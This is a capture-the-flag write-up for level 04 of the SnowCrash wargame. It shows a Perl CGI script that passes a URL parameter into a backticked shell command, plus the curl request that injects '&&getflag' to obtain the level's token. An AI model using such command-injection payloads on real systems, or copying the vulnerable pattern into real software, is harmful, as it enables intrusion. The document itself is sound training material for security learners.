# LEVEL 04

There is a perl file in our Home directory, which give us a lot if informations

```
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

Let's try a curl.
```
level04@SnowCrash:~$ curl -v localhost:4747
* About to connect() to localhost port 4747 (#0)
*   Trying 127.0.0.1... connected
> GET / HTTP/1.1
> User-Agent: curl/7.22.0 (i686-pc-linux-gnu) libcurl/7.22.0 OpenSSL/1.0.1 zlib/1.2.3.4 libidn/1.23 librtmp/2.3
> Host: localhost:4747
> Accept: */*
>
< HTTP/1.1 200 OK
< Date: Fri, 02 Dec 2022 17:38:00 GMT
< Server: Apache/2.2.22 (Ubuntu)
< Vary: Accept-Encoding
< Content-Length: 1
< Content-Type: text/html
<

* Connection #0 to host localhost left intact
* Closing connection #0
```

If we look deeper in our system, we can find an Apache directory, with a config file that look interesting for us
```
level04@SnowCrash:~$ cat /etc/apache2/sites-available/level05.conf
<VirtualHost *:4747>
        DocumentRoot    /var/www/level04/
        SuexecUserGroup flag04 level04
        <Directory /var/www/level04>
                Options +ExecCGI
                DirectoryIndex level04.pl
                AllowOverride None
                Order allow,deny
                Allow from all
                AddHandler cgi-script .pl
        </Directory>
</VirtualHost>
```

We see here that level04.pl il executed with the CGI.
also, the print cmd is backticked, so there is a place for command injection
>print \`echo $y 2>&1\`; 

Its simple as this :

provide an argument to echo which is `yo`

then execute getflag with `&& getflag`.
we have to URL encode the `&&` because query params URL cannot accept special characters

```
level04@SnowCrash:~$ curl localhost:4747?x=yo%26%26getflag
x=yo
Check flag.Here is your token : xxxxxxxxxxxxxxxxxxxxxxxxx
```


